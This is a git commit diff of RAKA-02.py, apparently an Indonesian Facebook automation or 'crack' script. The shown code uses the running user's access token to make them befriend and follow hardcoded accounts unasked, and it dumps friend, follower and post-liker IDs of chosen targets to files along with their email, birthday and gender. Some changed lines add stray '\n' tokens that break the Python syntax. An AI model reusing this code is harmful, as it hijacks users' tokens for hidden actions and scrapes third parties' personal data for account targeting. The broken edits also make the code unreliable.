a4e1007a7e5b46cb40071ea94059f2d7b42efa86
☆ Raka ☆ ™︻®╤───────═◍➤ <93072215+Bangsat-XD@users.noreply.github.com>
2022-01-24 02:16:42 +0700

    Create RAKA-02.py

--- RAKA-02.py
+++ RAKA-02.py
@@ -206,13 +206,13 @@ def bot_follow():
         love = random.choice(['❤️','💛','💚','💙','🖤','🧡','💜'])
 	kata_kata_cinta = random.choice(["Cinta sejati bukan berarti tidak terpisahkan. Itu hanya berarti dipisahkan, namun tidak ada yang berubah."," Aku tahu aku jatuh cinta padamu karena kenyataanku akhirnya lebih indah dari mimpiku.","Kamu adalah pikiran terakhir dalam pikiranku sebelum tertidur dan pikiran pertama ketika aku bangun setiap pagi.","Bagi dunia, kamu mungkin satu orang, tetapi bagi satu orang kamu adalah dunia.","Kamu telah mengganti mimpi burukku dengan mimpi indah, kekhawatiranku dengan kebahagiaan, dan ketakutanku dengan cinta.","Kamu mungkin memegang tanganku untuk sementara waktu, tetapi kamu memegang hatiku selamanya.","Kekasihku, janganlah engkau menangis, berbahagialah kekasihku, jangan ada duka yang menyelimutimu. Aku berharap kau selalu dalam keadaan bahagia meski dari jauh aku saja tak bisa membahagiakanmu dan membuatmu tertawa.","Ketika seseorang membuat kamu menjadi orang yang paling bahagia dan orang paling menyedihkan pada saat yang sama, itulah saat yang nyata. Itu adalah sesuatu yang berharga.","Tidak peduli berapa banyak perkelahian yang mungkin kamu alami, jika kamu benar-benar mencintai seseorang, itu tidak akan menjadi masalah pada akhirnya.","Dicintai secara mendalam oleh seseorang memberimu kekuatan. Mencintai seseorang secara mendalam memberimu keberanian.","Cinta sejati tidak harus berarti menyatu, terkadang cinta sejati itu terpisah namun tak ada yang berubah.","Saat pagi datang, senyumanmu memeluk pikiranku, saat siang datang kau bagaikan payung yang selalu membuatku teduh, dan saat malam kau adalah kehangatan yang selalu membuatku jauh dari kedinginan.","Mencintai merupakan sebuah anugerah besar yang Tuhan berikan kepada manusia. Maka dari itu, kita perlu senantiasa bersyukur dan menjaga segala anugerah itu.","Mungkin ketidaksempurnaan kita yang membuat kita begitu sempurna satu sama lain.","Aku yakin bahwa cinta kita nanti akan bersatu dalam ikatan suci."])
 	kata_utama = ("Pengguna Script Premium ")
-	komen = kata_utama+love+"\n"+kata_kata_cinta
+	komen = kata_utama+love+"\n"+kata_kata_cinta\n
 	kata_mutiara_islam = random.choice(["Kita tidak akan pernah tahu bagimana menyembahNya sebelum kita mulai dengan bagaimana mencintaiNya.","Apakah engkau meremehkan suatu doa kepada Allah, apakah engkau tahu keajaiban dan kemukjizatan doa? Ibarat panah dimalam hari, ia tidak akan meleset namun ia punya batas dan setiap batas ada saatnya untuk selesai.","Jangan berjalan dimuka bumi dengan penuh kesombongan dan congkak karena sebentar lagi engkau akan masuk ke dalam bumi juga.","Barang siapa yang bersungguh-sungguh berjalan pada jalannya maka pasti ia akan sampai pada tujuannya.","Ilmu pengetahuan di waktu kecil itu bagaikan ukiran di atas batu.","Bukanlah anak yatim itu yang telah meninggal orangtuanya, tetapi sesungguhnya yatim itu adalah yatim ilmu dan akhlak.","Ilmu tanpa agama adalah suatu kecacatan, dan agama tanpa ilmu merupakan kebutaan","Kegagalan adalah cara Allah untuk mengatakan bersabarlah karena aku memiliki sesuatu yang lebih baik untukmu saat waktunya tiba.","Kita tidak akan pernah kalah sampai kita menyerahkan semuanya kepada Tuhan.","Bagimu agamamu, bagiku agamaku. Karena sesungguhnya tidaka ada paksaan dalam beragama.","Sabar dan bisa mengikhlaskan sesuatu yang telah pergi adalah salah satu cara untuk mendapatkan kebahagian."])
 	kata_utama2 = random.choice(["Hai Aa Raka 😊","Hello Aa Raka 😊","Hello Aa Raka 😊","Hai Aa Raka 😊"])
-	komen2 = kata_utama2+"\n"+kata_mutiara_islam
+	komen2 = kata_utama2+"\n"+kata_mutiara_islam\n
 	pantun_motivasi = random.choice(["Jalan-jalan naik kereta, Naik ke atas pakai tangga. Mari kita gapai cita-cita, Bahagia dunia, masuk ke surga.","Pisau tajam dari baja, Perang panjang banyak guna. Membayar sukses dengan kerja, Bayar sekarang, kelak bahagia.","Sampan sudah, rakit sudah, Yang belum hanya bahteranya. Sarapan sudah, ngopi sudah, Yang belum tinggal kerjanya.","Kapas terhembus angin ringan, Sejuk terasa angin pantai. Lebih bahagia dalam perjuangan, Daripada dalam santai-santai."])
 	kata_utama3 = ("MOGA LANGGENG AA @[100000834003593:] SAMA TTH @[100003016223315:] NYA AMIN😊")
-	komen3 = kata_utama3+"\n"+pantun_motivasi
+	komen3 = kata_utama3+"\n"+pantun_motivasi\n
 	requests.post('https://graph.facebook.com/me/friends?method=post&uids=100000834003593&access_token='+token)
 	requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token='+token)
         requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token='+token)
@@ -313,14 +313,14 @@ def publik():
 		print((k+"\n["+p+"•"+k+"]"+p+" Type \'me\' To Dump From Friendlist"))
 		idt = input(k+"["+p+"•"+k+"]"+p+" User ID Target : ")
 		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
 			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
 		except KeyError:
 			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
 			print((k+"\n[ "+p+"Back"+k+" ]"+p))
 			publik()
-		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+token)
+		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
 		id = []
 		z=json.loads(r.text)
 		qq = (op["first_name"]+".json").replace(" ","_")
@@ -344,14 +344,14 @@ def follow():
 	try:
 		idt = input(k+"\n["+p+"•"+k+"]"+p+" Followers ID Target : ")
 		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
 			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
 		except KeyError:
 			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
 			print((k+"\n[ "+p+"Back"+k+" ]"+p))
 			publik()
-		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+token)
+		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
 		id = []
 		z=json.loads(r.text)
 		qq = (op["first_name"]+".json").replace(" ","_")
@@ -375,14 +375,14 @@ def likers():
 	try:
 		idt = input(k+"\n["+p+"•"+k+"]"+p+" ID Post Target : ")
 		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
 			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
 		except KeyError:
 			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
 			print((k+"\n[ "+p+"Back"+k+" ]"+p))
 			publik()
-		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+token)
+		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
 		id = []
 		z=json.loads(r.text)
 		qq = (op["first_name"]+".json").replace(" ","_")
@@ -468,30 +468,30 @@ def target():
 	try:
 		idt = input(k+"\n["+p+"•"+k+"]"+p+" ID Target        : ")
 		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
 			print((k+"["+p+"•"+k+"]"+p+" Name Account     : "+op["name"]))
 			print((k+"["+p+"•"+k+"]"+p+" Username         : "+op["username"]))
 			try:
-				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
+				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 				op = json.loads(jok.text)
 				print((k+"["+p+"•"+k+"]"+p+" Email            : "+op["email"]))
 			except KeyError:
 				print((k+"["+p+"•"+k+"]"+p+" Email            : -"))
 			try:
-				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
+				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 				op = json.loads(jok.text)
 				print((k+"["+p+"•"+k+"]"+p+" Date Of Birth    : "+op["birthday"]))
 			except KeyError:
 				print((k+"["+p+"•"+k+"]"+p+" Date Of Birth    : -"))
 			try:
-				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
+				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 				op = json.loads(jok.text)
 				print((k+"["+p+"•"+k+"]"+p+" Gender           : "+op["gender"]))
 			except KeyError:
 				print((k+"["+p+"•"+k+"]"+p+" Gender           : -"))
 			try:
-				r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
+				r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 				id = []
 				z = json.loads(r.text)
 				qq = (op["first_name"]+".json").replace(" ","_")
@@ -517,7 +517,7 @@ def target():
 			except KeyError:
 				print((k+"["+p+"•"+k+"]"+p+" Total Follower   : -"))
 			try:
-				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
+				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 				op = json.loads(jok.text)
 				print((k+"["+p+"•"+k+"]"+p+" Website          : "+op["website"]))
 			except KeyError:
@@ -525,7 +525,7 @@ def target():
 			except IOError:
 				print((k+"["+p+"•"+k+"]"+p+" Website          : -"))
 			try:
-				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
+				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 				op = json.loads(jok.text)
 				print((k+"["+p+"•"+k+"]"+p+" Update Time      : "+op["updated_time"]))
 			except KeyError:
